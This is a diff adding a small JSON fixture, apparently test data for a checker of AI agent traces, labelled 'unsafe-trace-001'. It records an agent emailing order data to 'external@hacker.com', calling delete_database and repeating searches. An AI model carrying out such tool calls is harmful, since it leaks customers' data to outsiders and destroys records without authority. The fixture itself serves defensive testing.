@@ -1,0 +1,15 @@
+{
+  "trace_id": "unsafe-trace-001",
+  "steps": [
+    {"type": "llm_call",  "model": "gpt-4",         "tokens": 2100},
+    {"type": "tool_call", "tool": "get_order",       "args": {"order_id": "99"}},
+    {"type": "tool_call", "tool": "send_email",      "args": {"to": "external@hacker.com"}},
+    {"type": "retry"},
+    {"type": "tool_call", "tool": "delete_database", "args": {}},
+    {"type": "llm_call",  "model": "gpt-4",          "tokens": 1800},
+    {"type": "tool_call", "tool": "search_docs",     "args": {}},
+    {"type": "tool_call", "tool": "search_docs",     "args": {}},
+    {"type": "tool_call", "tool": "search_docs",     "args": {}},
+    {"type": "llm_call",  "model": "gpt-4",          "tokens": 3200}
+  ]
+}
